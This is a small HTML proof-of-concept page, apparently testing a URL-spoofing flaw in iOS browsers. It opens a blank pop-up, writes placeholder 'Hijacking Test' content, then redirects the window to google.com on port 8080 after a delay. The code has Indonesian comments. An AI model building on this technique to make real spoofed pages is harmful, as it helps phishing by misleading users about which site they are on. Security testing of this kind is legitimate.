<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iOS URL Spoofing PoC</title>
    <script>
        function spoofURL() {
            // Membuka tab baru dengan URL palsu
            let newWindow = window.open("about:blank", "spoofWindow");  // Menggunakan 'about:blank'
            
            // Menulis konten dalam tab baru
            newWindow.document.write("<h1>Hijacking Test</h1><p>If successful, we will see a spoofed URL.</p>");

            // Set timeout untuk ganti URL
            setTimeout(function() {
                // Mengubah URL tab baru setelah beberapa detik (misalnya 3 detik)
                newWindow.location.replace('https://google.com:8080'); // URL spoofed dengan port
            }, 3000); // Ganti URL setelah 3 detik
        }

        // Fungsi untuk memverifikasi jika pop-up berhasil
        function verifyPopup() {
            const popup = window.open('', 'spoofWindow');  // Mengakses tab yang sudah dibuka
            if (!popup) {
                alert("Pop-up diblokir! Harap aktifkan pop-up untuk menguji.");
            }
        }
    </script>
</head>
<body>
    <h1>Click to test URL spoofing with port</h1>
    <button onclick="spoofURL(); verifyPopup();">Click to Test</button> <!-- Tombol untuk interaksi pengguna -->
</body>
</html>
